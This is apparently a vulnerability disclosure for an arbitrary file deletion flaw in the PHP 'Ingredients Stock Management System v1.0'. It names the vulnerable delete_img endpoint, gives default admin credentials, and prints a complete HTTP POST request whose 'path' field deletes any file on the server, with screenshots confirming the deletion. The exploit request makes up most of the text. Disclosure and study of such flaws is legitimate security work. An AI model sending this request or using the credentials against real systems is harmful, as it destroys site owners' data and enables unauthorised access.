# Ingredients Stock Management System v1.0 by oretnom23 has Delete any file

vendors: https://www.sourcecodester.com/php/15364/ingredients-stock-management-system-phpoop-free-source-code.html

Vulnerability File: /isms/classes/Master.php?f=delete_img

Vulnerability location: /isms/classes/Master.php?f=delete_img, path

The password for the backend login account is: admin/admin123

Payload:

Here we delete the shell.php file in the root directory

```sql
POST /isms/classes/Master.php?f=delete_img HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: _ga=GA1.1.1382961971.1655097107
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

path=C:\xampp\htdocs\pms\shell.php
```

Currently, when we do not send a request to delete the shell.php file, the shell.php file is still in the root directory of the website

![image](https://user-images.githubusercontent.com/54017627/179383548-8111a46f-2baa-4f41-8ae7-3771354d56ed.png)


The response package shows that the deletion was successful. Let's go to the root directory to see if the shell.php file still exists.
![image](https://user-images.githubusercontent.com/54017627/179383630-5046ec5e-af1a-46fd-a535-3d1d1894ccf0.png)


By this time, shell.php has been deleted.

![image](https://user-images.githubusercontent.com/54017627/179383635-a89d93c7-1620-44c8-a7cf-905cddd1b75a.png)
